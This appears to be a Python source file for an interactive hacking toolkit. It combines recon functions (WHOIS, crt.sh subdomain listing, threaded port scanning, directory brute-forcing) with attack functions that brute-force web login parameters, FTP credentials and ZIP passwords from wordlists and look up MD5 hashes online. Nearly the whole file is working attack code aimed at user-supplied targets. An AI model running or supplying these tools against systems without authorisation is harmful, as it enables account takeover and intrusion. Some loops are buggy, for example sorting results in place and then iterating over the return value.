#!/usr/env python3

import sys, os
import requests
import socket
from datetime import datetime
import time
import random, re
import whois # pip install python-whois
import threading
import pyzipper
import ftplib
# Personal Library
from lib.banner import banner, clrscr


#---# Tools Worker #---#
port_scan_temp = []
dir_enum_temp = []


#---# Indicator Variables #---#
ftp_stop = False
zip_stop = False


#---# Worker for Multithreading #---#
def worker_ZipCracker(zip_obj, password):
	global zip_stop
	try:
		print(f"[.] Trying password : {password}")
		zip_obj.extractall(path='extracted/', pwd=password.encode())
		print(f"[+] Password found : {password}")
		print(f"    Extracted result at 'extract' folder")
		zip_stop = True
	except RuntimeError as err:
			pass

def worker_FTP(target, port, username, password):
	global ftp_stop
	try:
		connector = ftplib.FTP()
		connector.connect(target, port, timeout=3)
		connector.login(username, password)
		ftp_stop = True
		print(f"[+] Login success with credential {username}:{password}")
	except ftplib.error_perm as err:
		#print(f"[x] Err: {err}")
		pass
	except TimeoutError as err:
		pass

def worker_PortScan(target, port_num):
	global port_scan_temp
	#print("[.] Worker started..")
	#print(f"- Checking port number {port_num}")
	try:
		target_ip = socket.gethostbyname(target)
	except socket.gaierror as err:
		print(f"[x] Err: {err}")
	port = int(port_num)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#
	# sock.connect((target_ip, port))
	# sock.send('WhoAreYou\r\n'.encode())
	# banner = sock.recv(1024)
	# port_scan_temp.append([target, port, banner])
	# sock.close()
	try:
		sock.connect((target_ip, port))
		#print(f"- Port {port_num} is active!")
		sock.send('WhoAreYou\r\n'.encode())
		banner = sock.recv(1024)
		#print(f"- Info port {port_num} : {target}, {port}, {banner}")
		port_scan_temp.append([target, port, banner])
		sock.close()
	except TimeoutError as err:
		#print("[x] Err: {err}")
		pass
	except Exception as err:
		#print(f"[x] Err: {err}")
		pass

def worker_DirEnum(url, path):
	global dir_enum_temp
	fix_url = f"{url}/{path}"
	#print(f"- Testing {fix_url}")
	response = requests.get(fix_url)
	status_code = response.status_code
	content_length = len(response.text)
	#if response.ok:
	#	print(f"{status_code} - {content_length} - {fix_url}")
	#	dir_enum_temp.append([fix_url, status_code, content_length])
	print(f"{status_code} - {content_length} - {fix_url}")
	dir_enum_temp.append([fix_url, status_code, content_length])
	#requests.exceptions.ConnectTimeout

def worker_Intruder(url, mode=1, payload={}):
	if mode == 1:
		req = requests.get(url)
		redirect_status = "Not Redirected"
		if len(req.history) != 0:
			redirect_status = "Redirected!"
		else:
			redirect_status = "Not Redirected"
		print(f"{req.status_code} - {len(req.text)} - {redirect_status} - {url}")
	elif mode == 2:
		req = requests.post(url, data=payload)
		redirect_status = ''
		if len(req.history) != 0:
			redirect_status = "Redirected!"
		else:
			redirect_status = "Not Redirected"
		#print(f"{req.status_code} - {len(req.text)} - {req.url} - {redirect_status} ({payload})")
		print(f"{req.status_code} - {len(req.text)} - {len(req.url)} - {redirect_status} - ({payload})")
	#pass


#---# Recon Tools #---#
def recon_Whois():
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Recon > Simple WHOIS Lookup       |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		print("[?] Enter target domain (ex: google.com)")
		target = str(input(" ⤷ Target : "))
		if target == "" or target == None:
			print("[x] Can't leave it empty dude.. press [ENTER]..")
			input()
			main()
		print(f"[*] Getting WHOIS information for {target}\n")
		try:
			whois_info = whois.whois(target)
			for key in whois_info:
				key_name = str(key).replace("_", " ")
				print(f"◦ {key_name.title()} : {whois_info[key]}")
		except Exception as err:
			print(f"[x] Err: {err}")
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("(X) Good Bye!")
		sys.exit(0)

def recon_SubEnum():
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Recon > Subdomain Enum (via CRT)  |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		print("[?] Enter target domain (ex: google.com)")
		domain = str(input(" ⤷ Target : "))
		if domain == "" or domain == None:
			print("[x] Can't leave it empty dude.. press [ENTER]..")
			input()
			main()
		print(f"[*] Getting list of subdomains from CRT for {domain}")
		try:
			regex = "<TD>(.*?)</TD>"
			response = ''
			while True:
				response = requests.get(f"https://crt.sh/?q={domain}")
				if "429 Too Many Requests" not in response.text:
					break
				else:
					print("[-] HTTP Request return code 429 Too Many Requests, retrying..")
					time.sleep(1)
			raw_list = re.findall(regex, response.text)
			fin_list = []
			for subdomain in raw_list:
				if (domain in subdomain.strip()) and (subdomain.strip() not in fin_list) and ('>' not in subdomain.strip()) and ('*' not in subdomain.strip()):
					fin_list.append(subdomain.strip())
			print(f"[*] Found {len(fin_list)} total of subdomains..\n")
			fin_list.sort()
			for subdomain in fin_list:
				print(subdomain)
			print("\n[o] Press [ENTER] to return to main menu..")
			input()
			main()
		except Exception as err:
			print(f"[x] Err: {err}")
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("(X) Good Bye!")
		sys.exit(0)

def recon_PortScan():
	socket.setdefaulttimeout(2)
	port_scan_temp.clear()
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Recon > Simple Port Scanner       |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		# Specify target
		print("[?] Enter target host (ex: celerates.com or 192.168.1.1)")
		target = str(input(" ⤷ Target : "))
		if target == "" or target == None:
			print("[x] Can't leave it empty dude.. press [ENTER]..")
			input()
			main()
		# Specify scan range
		print("[?] Enter port scanning range (ex: 1-1024 or 1-65535)")
		raw_range = str(input(" ⤷ Range : "))
		range_start, range_end = raw_range.split("-")
		# Specify number of threads used
		print("[?] Enter number of threads to use (default: 30)")
		num_threads = int(input(" ⤷ Number of threads : "))
		# Running
		print(f"[*] Scanning {target} for active port within range {range_start} to {range_end}..\n")
		threads = list()
		n_port = int(range_start)
		try:
			while n_port <= int(range_end):
				for id_worker in range(0, num_threads):
					if n_port <= int(range_end):
						x = threading.Thread(target=worker_PortScan, args=(target, n_port))
						threads.append(x)
						#print(f"[Log] Scan port number-{str(n_port)} by worker-{str(id_worker)}")
						n_port += 1
						x.start()
				for thread in threads:
					thread.join()
		except Exception as err:
			print(f"[x] Err: {err}")
		print(f"\n[+] Port scanning result for {target} : \n")
		for result in port_scan_temp.sort():
			target, port, banner = result
			print(f"◦ Port {port}")
			print(f"  ⤷ {banner}")
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("    Waiting for all thread is finished..")
		for thread in threads:
			thread.join()
		print("(X) Good Bye!")
		sys.exit(0)

def recon_DirEnum():
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Recon > Directory Enumeration     |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		print("[?] Enter target URL (ex: https://www.celerates.com)")
		# Specify target
		target = str(input(" ⤷ Target : "))
		if target == "" or target == None:
			print("[x] Can't leave it empty dude.. press [ENTER]..")
			input()
			main()
		# Specify wordlist to use
		print("[?] Enter directory wordlist to use (def: ./wordlists/dicc.txt)")
		wordlist_file = str(input(" ⤷ Wordlist : "))
		# Specify number of threads
		print("[?] Enter number of threads to use (default: 30)")
		num_threads = int(input(" ⤷ Number of threads : "))
		# Opening wordlist
		wordlists_raw = open(wordlist_file, 'r')
		wordlists_per = wordlists_raw.readlines()
		# Running
		print(f"[*] Start bruteforcing on {target}\n")
		try:
			threads = list()
			line_read = 0
			while line_read < len(wordlists_per):
				for id_worker in range(0, int(num_threads)):
					x = threading.Thread(target=worker_DirEnum, args=(target, wordlists_per[line_read].strip('\n')))
					threads.append(x)
					line_read += 1
					x.start()
				for thread in threads:
					thread.join()
		except Exception as err:
			print(f"[x] Err: {err}")
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("    Waiting for all thread is finished..")
		for thread in threads:
			thread.join()
		print("(X) Good Bye!")
		sys.exit(0)


#---# Attack Tools #---#
def attack_Intruder():
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Attack > HTTP GET/POST Intruder   |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		# Select mode :
		print("[?] Select Mode :")
		print("    1. GET Method")
		print("    2. POST Method")
		mode = int(input(" ⤷ Mode : "))
		if mode == 1:
			# Specify target urls
			print("[?] Enter target url (ex: https://www.celerates.com/login?username={bangor}&password={bangor})")
			print("    Note: Mark the desired param to attack using {bangor} marker")
			target = str(input(" ⤷ Target : "))
			if target == "" or target == None:
				print("[x] Can't leave it empty dude.. press [ENTER]..")
				input()
				main()
			# Counting the nummber of marker and split mode
			print(f"[*] Found {target.count('{bangor}')} marker at target..")
			if target.count('{bangor}') == 1:
				# Getting the parameter
				param = target.split('?')[1].split('&')
				print(f"    Param : {param}")
				# Wordlist file
				print("[?] Enter wordlist file to use for attack")
				wordlist = str(input(" ⤷ Wordlist : "))
				# Opening wordlist
				wordlists_raw = open(wordlist, 'r')
				wordlists_per = wordlists_raw.readlines()
				print(f"    Loaded {len(wordlists_per)} wordphrase to use..")
				# Number of threads
				print("[?] Enter number of thread to use (def: 30)")
				n_threads = int(input(" ⤷ Number of threads : "))
				# Start attacking
				line_read = 0
				threads = list()
				for i in range(len(wordlists_per)):
					for n_worker in range(n_threads):
						url_craft = target.replace('{bangor}', wordlists_per[i].strip('\n'))
						x = threading.Thread(target=worker_Intruder, args=(url_craft,))
						threads.append(x)
						i += 1
						x.start()
					for thread in threads:
						thread.join()
			elif target.count('{bangor}') == 2:
				# Getting the parameter
				param = target.split('?')[1].split('&')
				print(f"    Param : {param}")
				# Wordlist file
				print("[?] Enter wordlist file to use for attack")
				wordlist = str(input(" ⤷ Wordlist : "))
				# Opening wordlist
				wordlists_raw = open(wordlist, 'r')
				wordlists_per = wordlists_raw.readlines()
				print(f"    Loaded {len(wordlists_per)} wordphrase to use..")
				# Number of threads
				print("[?] Enter number of thread to use (def: 30)")
				n_threads = int(input(" ⤷ Number of threads : "))
				# Start attacking
				line_read = 0
				threads = list()
				for i in range(len(wordlists_per)):
					for j in range(len(wordlists_per)):
						host = target.split('?')[0]
						param1 = target.split('?')[1].split('&')[0].replace('{bangor}', wordlists_per[i])
						param2 = target.split('?')[1].split('&')[1].replace('{bangor}', wordlists_per[j])
						url_craft = f"{host}?{param1}&{param2}"
						for n_worker in range(n_threads):
							x = threading.Thread(target=worker_Intruder, args=(url_craft,))
							threads.append(x)
							j += 1
							x.start()
						for thread in threads:
							thread.join()
			else:
				print("[x] Err: Too much marker on target! Maximum marker is 2!")
		elif mode == 2:
			# Mode POST
			# Specify target urls
			print("[?] Enter target url (ex: https://www.celerates.com/login")
			target = str(input(" ⤷ Target : "))
			if target == "" or target == None:
				print("[x] Can't leave it empty dude.. press [ENTER]..")
				input()
				main()
			# Specify payload
			print("[?] Specify POST data to send (ex: param1={bangor}&param2={bangor})")
			print("    Note: Mark the desired param to attack using {bangor} marker (max:2)")
			payload_raw = str(input(" ⤷ Data : "))
			# Counting the nummber of marker and split mode
			print(f"[*] Found {payload_raw.count('{bangor}')} marker at POST data..")
			# Getting wordlist
			print("[?] Enter wordlist file to use for attack")
			wordlist = str(input(" ⤷ Wordlist : "))
			# Opening wordlist
			wordlists_raw = open(wordlist, 'r')
			wordlists_per = wordlists_raw.readlines()
			print(f"    Loaded {len(wordlists_per)} wordphrase to use..")
			# Number of threads
			print("[?] Enter number of thread to use (def: 30)")
			n_threads = int(input(" ⤷ Number of threads : "))
			# Start attacking
			print("\nSTATUS - CONTENT LENGTH - URL LENGTH - REDIRECT - PAYLOAD")
			threads = list()
			if payload_raw.count('{bangor}') == 1:
				# Start attacking
				p1_line = 0
				while p1_line < len(wordlists_per):
					if p1_line == len(wordlists_per):
						break
					for n_worker in range(n_threads):
						if p1_line < len(wordlists_per):
							# param1_key = payload_raw.split('=')[0]
							# param1_val = payload_raw.split('=')[1]
							# payload_new = {param1_key:param1_val}
							payload_new = dict()
							split_param = payload_raw.split('&')
							for param in split_param:
								key,value = param.split('=')
								if value == '{bangor}':
									payload_new[key] = wordlists_per[p1_line].strip('\n')
								else:
									payload_new[key] = value
							x = threading.Thread(target=worker_Intruder, args=(target, 2, payload_new))
							threads.append(x)
							p1_line += 1
							x.start()
						else:
							break
					for thread in threads:
						thread.join()
			elif payload_raw.count('{bangor}') == 2:
				# Start attacking
				p1_line = 0
				p2_line = 0
				while p1_line < len(wordlists_per):
					for n_worker in range(0, n_threads):
						if p1_line == len(wordlists_per):
							break
						if p2_line < len(wordlists_per):
							#print(f"i/j : {p1_line}/{p2_line}")
							payload_new = dict()
							split_param = payload_raw.split('&')
							marker_found = 0
							for param in split_param:
								key,value = param.split('=')
								if value == '{bangor}' and marker_found == 0:
									payload_new[key] = wordlists_per[p1_line].strip('\n')
									marker_found += 1
								elif value == '{bangor}' and marker_found == 1:
									payload_new[key] = wordlists_per[p2_line].strip('\n')
								else:
									payload_new[key] = value
							x = threading.Thread(target=worker_Intruder, args=(target, 2, payload_new))
							threads.append(x)
							p2_line += 1
							x.start()
						else:
							p1_line += 1
							p2_line = 0
					for thread in threads:
						thread.join()
			else:
				print("[x] Err: Too much marker on target! Maximum marker is 2!")
		else:
			pass
		# Done
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("(X) Good Bye!")
		sys.exit(0)

def attack_HashCrack():
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Attack > MD5 Hash Crack (Online)  |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		# Select mode :
		print("[?] Enter MD5 hash to crack below")
		hash2crack = str(input(" ⤷ Hash : "))
		print("[*] Searching in database..")
		req = requests.get(f"https://nitrxgen.net/md5db/{hash2crack}")
		if req.text == '':
			print("[-] Hash not found :(")
		else:
			print(f"[+] Hash found! : {req.text}")
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("(X) Good Bye!")
		sys.exit(0)

def attack_ArchiveCrack():
	global zip_stop
	zip_stop = False
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Attack > ZIP Password Bruteforcer |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		# Select mode :
		print("[?] Enter ZIP file to crack")
		zip_file = str(input(" ⤷ Path to zip file : "))
		print("[?] Enter wordlist to use")
		wordlist_file = str(input(" ⤷ Wordlist : "))
		wordlist_raw = open(wordlist_file, 'r')
		wordlist_per = wordlist_raw.readlines()
		# Number of thread
		print("[?] Number of threads to use")
		n_threads = int(input(" ⤷ Number of threads : "))
		# Brute force attack
		print("[*] Load ")
		zip_obj = pyzipper.AESZipFile(zip_file, 'r', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES)
		line_read = 0
		threads = list()
		while (line_read < len(wordlist_per)) and (zip_stop == False):
			for worker in range(n_threads):
				if (line_read < len(wordlist_per)) and (zip_stop == False):
					password = wordlist_per[line_read].strip('\n')
					x = threading.Thread(target=worker_ZipCracker, args=(zip_obj, password))
					threads.append(x)
					x.start()
					line_read += 1
				else:
					pass
			for thread in threads:
				thread.join()
		# for password in wordlist_per:
		# 	password = password.strip('\n')
		# 	try:
		# 		print(f"[.] Trying password : {password}")
		# 		zip_obj.extractall(path='extracted/', pwd=password.encode())
		# 		print(f"[+] Password found : {password}")
		# 		print(f"    Extracted result at 'extract' folder")
		# 		break
		# 	except RuntimeError as err:
		# 		pass
		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("(X) Good Bye!")
		sys.exit(0)

def attack_FTPCrack():
	global ftp_stop
	ftp_stop = False
	clrscr()
	print("#-----#-----#-----#-----#-----#-----#")
	print("| Attack > FTP Bruteforcer          |")
	print("#-----#-----#-----#-----#-----#-----#\n")
	try:
		# Select mode :
		print("[?] Attack Mode :")
		print("    1. Password Bruteforce")
		print("    2. Username & Password Bruteforce")
		mode = int(input(" ⤷ Mode : "))
		print("[?] Enter target host")
		target = str(input(" ⤷ Host : "))
		print("[?] FTP port number (def:21)")
		port_num = int(input(" ⤷ Port : "))
		print("[?] Enter wordlist to use")
		wordlist_file = str(input(" ⤷ Wordlist : "))
		wordlist_raw = open(wordlist_file, 'r')
		wordlist_per = wordlist_raw.readlines()	
		# Thread
		print("[?] Enter number of thread to use")
		n_threads = int(input(" ⤷ Number of thread :"))
		# Brute force attack
		if mode == 1:
			print("[?] Enter username of targeted account")
			username = str(input(" ⤷ Username : "))
			# Password-only attack
			line_read = 0
			while line_read < len(wordlist_per) and (ftp_stop == False):
				threads = list()
				for n_worker in range(n_threads):
					if line_read < len(wordlist_per):
						password = wordlist_per[line_read].strip()
						print(f"[*] Testing [{line_read}] {username}:{password}")
						x = threading.Thread(target=worker_FTP, args=(target, int(port_num), username, password))
						threads.append(x)
						line_read += 1
						x.start()
					else:
						pass
				for thread in threads:
					thread.join()
				# try:
				# 	print(f"[*] Trying credential '{username}':'{password}'..")
				# 	connector = ftplib.FTP()
				# 	connector.connect(target, int(port_num), timeout=3)
				# 	connector.login(username, password)
				# 	print(f"[+] Login success using password : {password}")
				# 	break
				# except ftplib.error_perm as err:
				# 	#print(f"[x] Err: {err}")
				# 	pass
		elif mode == 2:
			line_read1 = 0
			line_read2 = 0
			threads = list()
			while line_read1 < len(wordlist_per) and (ftp_stop == False):
				while line_read2 < len(wordlist_per) and (ftp_stop == False):
					for n_worker in range(n_threads):
						if line_read2 < len(wordlist_per):
							username = wordlist_per[line_read1].strip()
							password = wordlist_per[line_read2].strip()
							print(f"[*] Testing [{line_read1}/{line_read2}] {username}:{password}")
							x = threading.Thread(target=worker_FTP, args=(target, int(port_num), username, password))
							threads.append(x)
							line_read2 += 1
							x.start()
						elif line_read2 >= len(wordlist_per):
							line_read2 = 0
							line_read1 += 1
						else:
							pass
					for thread in threads:
						thread.join()

		print("\n[o] Press [ENTER] to return to main menu..")
		input()
		main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("(X) Good Bye!")
		sys.exit(0)

#---# Main Program #---#
def main():
	clrscr()
	banner()
	try:
		option = str(input("[>] Choose option : "))
		if option == "1a":
			recon_Whois()
		elif option == "1b":
			recon_SubEnum()
		elif option == "1c":
			recon_PortScan()
		elif option == "1d":
			recon_DirEnum()
		elif option == "2a":
			attack_Intruder()
		elif option == "2b":
			attack_HashCrack()
		elif option == "2c":
			attack_ArchiveCrack()
		elif option == "2d":
			attack_FTPCrack()
		elif option == "0":
			print("(X) Good Bye!")
			sys.exit(0)
		else:
			print("[x] Invalid option! Press [ENTER]..")
			input()
			main()
	except KeyboardInterrupt:
		print("\n(*) Stopping program due to Keyboard Interrupt..")
		print("[x] Good Bye!")
		sys.exit(0)


if __name__ == '__main__':
	main()